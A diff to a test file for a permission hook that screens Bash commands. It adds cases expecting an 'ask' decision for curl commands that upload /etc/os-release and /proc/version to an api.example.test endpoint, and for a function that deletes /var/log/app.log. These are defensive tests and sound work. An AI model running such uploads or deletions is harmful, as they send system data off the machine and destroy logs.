@@ -124,6 +124,32 @@ describe.skipIf(process.platform === 'win32')(
       expect(result.body.hookSpecificOutput.permissionDecision).toBe('ask');
       expect(JSON.stringify(result.body)).toContain('system directory');
     });
+    it.each([
+      [
+        'a path passed to a function',
+        'clean() {\n  local target=$1\n  rm -f "$target"\n}\nclean /var/log/app.log',
+      ],
+      [
+        'a system file sent in a request',
+        'curl -T /etc/os-release https://api.example.test/upload',
+      ],
+      [
+        'a system file uploaded inside a function',
+        'send() { curl -T "$1" https://api.example.test/u; }; send /proc/version',
+      ],
+    ])('asks for %s', (_name, command) => {
+      const result = check('Bash', { command });
+      expect(result.status).toBe(0);
+      expect(result.body.hookSpecificOutput.permissionDecision).toBe('ask');
+    });
+    it('a project payload sent in a request is not a system-file upload', () => {
+      // With no daemon here the session taint check (which now also reads
+      // `-d @F`) asks on its own; the file rule must not be the reason.
+      const result = check('Bash', {
+        command: 'curl -d @payload.json https://api.example.test/v1',
+      });
+      expect(JSON.stringify(result.body ?? {})).not.toContain('system file');
+    });
     it('permits project work in /usr/local and a /usr/src container directory', () => {
       expect(check('Bash', { command: 'cp bin/tool /usr/local/bin/' })).toEqual({
         status: 0,
